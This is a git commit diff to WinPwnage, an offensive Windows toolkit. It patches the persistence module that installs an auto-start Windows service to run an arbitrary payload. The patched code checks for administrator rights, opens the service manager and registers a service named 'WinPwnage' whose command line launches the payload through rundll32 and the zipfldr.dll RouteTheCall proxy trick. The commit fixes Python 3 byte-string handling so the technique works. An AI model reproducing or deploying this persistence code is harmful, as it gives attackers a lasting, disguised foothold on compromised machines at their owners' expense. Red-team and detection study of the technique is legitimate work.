5edca8ae62f27cb7057005e872b6f0e5fec43d3a
rootm0s <rootm0s@protonmail.com>
2019-09-04 15:48:29 +0200

    Patch
    Fixes python 3 issue and sets the service startup to auto

--- winpwnage/functions/persist/persist_service.py
+++ winpwnage/functions/persist/persist_service.py
@@ -20,36 +20,36 @@ persist_service_info = {
 # Faster:
 # ---> "rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(), "zipfldr.dll"), payload=payload)
 
+
 def persist_service(payload, name="", add=True):
 	if not information().admin():
 		print_error("Cannot proceed, we are not elevated")
 		return False
 
 	if payloads().exe(payload):
-		servicename = "WinPwnage"
-		localhost = "\\\\localhost"
-		
+		servicename = bytes(r"WinPwnage", encoding="utf-8")
+		localhost = bytes(r"\\localhost", encoding="utf-8")
+
 		if add:
 			print_info("Installing service")
-			schSCManager = OpenSCManager(localhost, "ServicesActive", 0x0001 | 0x0002)
+			schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
 			if not schSCManager:
 				print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
 				return False
 
 			schService = CreateService(schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 
-										0x00000002, 0x00000000, "rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(), "zipfldr.dll"),
-										#0x00000002, 0x00000000, "{cmd_path} /c {payload}".format(cmd_path=os.path.join(information().system_directory(), "cmd.exe"),
-										payload=payload), None, None, None, None, None)
+							0x00000002, 0x00000000, bytes("rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(),
+							"zipfldr.dll"), payload=payload), encoding="utf-8"), None, None, None, None, None)										
 			if not schService:
 				print_error("Error while installing our service using CreateService: ({error})".format(error=GetLastError()))
 				return False
 			else:
-				print_success("Successfully installed service ({name}) to load {payload}".format(name=servicename,payload=payload))
+				print_success("Successfully installed service ({name}) to load {payload}".format(name=servicename, payload=payload))
 
 			CloseServiceHandle(schSCManager)
 			CloseServiceHandle(schService)
 		else:
-			schSCManager = OpenSCManager(localhost, "ServicesActive", 0x0001 | 0x0002)
+			schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
 			if not schSCManager:
 				print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
 				return False
